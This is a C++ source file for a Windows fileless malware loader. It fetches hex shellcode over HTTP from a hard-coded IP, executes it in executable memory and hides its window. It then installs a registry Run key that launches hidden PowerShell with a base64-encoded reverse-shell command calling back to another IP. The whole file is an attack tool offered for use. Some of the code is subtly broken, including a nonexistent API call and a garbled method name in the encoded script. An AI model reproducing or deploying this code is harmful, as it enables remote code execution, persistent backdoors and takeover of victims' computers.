// fileless_injector_with_persistence.cpp
// Requires linking with WinHTTP or cpr (or minimal HTTP client); here we show a Windows native approach using WinInet for HTTP GET.

// Compile with: cl /EHsc /nologo fileless_injector_with_persistence.cpp /link wininet.lib advapi32.lib

#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "wininet.lib")

// Simple HTTP GET using WinInet, returns response body as string
std::string HttpGet(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("FilelessInjector", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead;
    std::string response;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        response.append(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

// Converts a hex string (with possible separators) to a byte vector
std::vector<unsigned char> HexStringToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    size_t len = hex.length();

    for (size_t i = 0; i < len; ) {
        if (isxdigit(hex[i]) && i + 1 < len && isxdigit(hex[i+1])) {
            unsigned int byte;
            std::stringstream ss;
            ss << std::hex << hex.substr(i, 2);
            ss >> byte;
            bytes.push_back(static_cast<unsigned char>(byte));
            i += 2;
        }
        else {
            ++i; // skip non-hex chars (spaces, commas, etc)
        }
    }

    return bytes;
}

// Inject shellcode and execute in current process memory (fileless execution)
bool ExecuteShellcode(const std::vector<unsigned char>& shellcode) {
    if (shellcode.empty()) return false;

    void* exec_mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return false;

    memcpy(exec_mem, shellcode.data(), shellcode.size());

    // Flush instruction cache for execution safety
    FlushInstructionCache(GetCurrentProcess(), exec_mem, shellcode.size());

    // Run shellcode as function
    ((void(*)())exec_mem)();

    // Free after execution if desired (optional)
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return true;
}

// Adds a persistent Run key for PowerShell with encoded command
bool AddPersistenceRegistry(const std::wstring& name, const std::wstring& encodedCommand) {
    HKEY hKey;
    // Open HKLM\Software\Microsoft\Windows\CurrentVersion\Run for writing
    LONG res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey);
    if (res != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open Run registry key, error: " << res << L"\n";
        return false;
    }

    // Construct command string: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64>
    std::wstring command = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + encodedCommand;

    res = RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (const BYTE*)command.c_str(), (DWORD)((command.size() + 1) * sizeof(wchar_t)));
    RegCloseHandle(hKey);

    if (res != ERROR_SUCCESS) {
        std::wcerr << L"Failed to set Run registry value, error: " << res << L"\n";
        return false;
    }

    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Hide console window immediately
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    // 1) Fetch hex shellcode from remote URL (example IP)
    std::string hexPayload = HttpGet("http://192.168.29.208/home");
    if (hexPayload.empty()) {
        MessageBoxA(NULL, "Failed to download payload.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // 2) Convert hex string to bytes (skip first 2 chars as in your original)
    if (hexPayload.length() < 2) return -1;
    std::string hexData = hexPayload.substr(2);
    std::vector<unsigned char> shellcode = HexStringToBytes(hexData);

    // 3) Execute shellcode in-memory
    if (!ExecuteShellcode(shellcode)) {
        MessageBoxA(NULL, "Shellcode execution failed.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // 4) Add persistence registry key with a sample base64-encoded PowerShell command
    // (replace this with your actual encoded command)
    std::wstring regName = L"Baaaa";
    std::wstring encodedPSCommand = L"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHcALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAzADMALgAxACIALAA0ADAAMAA0ACkAOwAkAHMAdAByAGUAYQBtAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawA9ACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgA9ACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAEwAYQB0AGUAbAB5ACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==";

    if (!AddPersistenceRegistry(regName, encodedPSCommand)) {
        MessageBoxA(NULL, "Failed to add persistence registry.", "Warning", MB_OK | MB_ICONWARNING);
    }

    return 0;
}
